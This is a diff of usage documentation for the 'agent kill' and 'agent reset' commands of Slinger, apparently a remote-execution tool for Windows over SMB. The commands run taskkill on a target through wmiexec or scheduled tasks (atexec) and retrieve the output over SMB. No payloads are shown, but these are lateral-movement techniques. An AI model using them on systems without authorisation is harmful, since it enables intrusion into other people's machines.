+usage: agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
+                  [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                  [-w SECS]
+                  agent_id
 Find and terminate the agent process using taskkill via WMI or Task Scheduler
 ```
 
@@ -3612,6 +3776,8 @@ Examples:
 
 Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
       They are ignored when using the default wmiexec method.
+      Both methods save output to a temp file on target and retrieve it via SMB.
+      --sp should be reachable from the connected share.
 
 ```
 
@@ -3621,7 +3787,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 - **`method`**: Execution method for taskkill (default: wmiexec)
   - Choices: wmiexec, atexec
   - Default: `wmiexec`
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -3631,7 +3797,6 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -3666,9 +3831,9 @@ Example: agent rm slinger_abc123
 
 **Help:**
 ```
-usage: agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH]
-                           [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
-                           [--tf FOLDER] [--sh SHARE] [-w SECS]
+usage: agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
+                   [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                   [-w SECS]
 Kill all running agent processes and delete all agent files
 ```
 
@@ -3681,6 +3846,8 @@ Examples:
 
 Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
       They are ignored when using the default wmiexec method.
+      Both methods save output to a temp file on target and retrieve it via SMB.
+      --sp should be reachable from the connected share.
 
 ```
 
@@ -3689,7 +3856,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 - **`method`**: Execution method for kill operations (default: wmiexec)
   - Choices: wmiexec, atexec
   - Default: `wmiexec`
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -3699,7 +3866,6 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
